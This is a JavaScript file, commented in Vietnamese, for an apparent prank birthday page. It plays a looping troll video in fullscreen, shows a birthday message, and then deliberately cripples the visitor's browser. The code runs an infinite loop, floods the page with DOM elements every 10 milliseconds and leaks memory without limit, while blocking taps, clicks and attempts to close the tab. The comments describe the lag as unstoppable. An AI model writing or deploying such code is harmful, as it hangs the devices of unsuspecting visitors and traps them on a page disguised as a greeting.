// Lấy phần tử DOM
const startButton = document.getElementById('startButton');
const trollVideo = document.getElementById('trollVideo');
const birthdayMessage = document.getElementById('birthdayMessage');

// Hàm gây lag mạnh mẽ không thể dừng
function causeExtremeLag() {
    // Vòng lặp vô hạn nhiều lớp
    function infiniteLoop() {
        while (true) {
            // Thêm các thao tác vô hạn
            console.log(Math.random());
        }
    }

    // Tạo các phần tử DOM liên tục
    setInterval(() => {
        for (let i = 0; i < 1000; i++) {
            const div = document.createElement('div');
            div.style.width = '100px';
            div.style.height = '100px';
            div.style.background = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.5)`;
            div.style.position = 'absolute';
            div.style.left = `${Math.random() * window.innerWidth}px`;
            div.style.top = `${Math.random() * window.innerHeight}px`;
            document.body.appendChild(div);
        }
    }, 10);

    // Gây sử dụng tài nguyên bộ nhớ bằng cách đẩy các đối tượng lớn vào mảng
    const memoryLeak = [];
    setInterval(() => {
        for (let i = 0; i < 1000; i++) {
            memoryLeak.push(new Array(1000).fill('LAGGING!'));
        }
    }, 10);

    // Vòng lặp vô hạn khác để tăng sử dụng CPU
    setTimeout(() => {
        infiniteLoop();
    }, 0);
}

// Chặn người dùng thoát hoặc nhấn vào màn hình
function blockScreenActions() {
    window.addEventListener('touchstart', (e) => e.preventDefault(), { passive: false });
    window.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
    window.addEventListener('touchend', (e) => e.preventDefault(), { passive: false });
    window.addEventListener('click', (e) => e.preventDefault(), { passive: false });
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = ''; // Chặn hành động đóng tab
    });
}

// Sự kiện nhấn nút
startButton.addEventListener('click', () => {
    // Hiển thị video và phát liên tục
    trollVideo.style.display = 'block'; // Hiển thị video
    trollVideo.volume = 1.0; // Đặt âm lượng
    trollVideo.play(); // Phát video
    trollVideo.loop = true; // Đảm bảo video phát liên tục
    trollVideo.requestFullscreen(); // Toàn màn hình

    // Hiển thị thông báo sinh nhật sau 1 giây
    setTimeout(() => {
        birthdayMessage.classList.remove('hidden'); // Hiển thị thông báo

        // Gây lag sau 3 giây
        setTimeout(() => {
            causeExtremeLag(); // Gọi hàm gây lag mạnh mẽ không bao giờ dừng
        }, 3000);

        // Chặn tất cả thao tác của người dùng
        blockScreenActions();
    }, 1000);
});
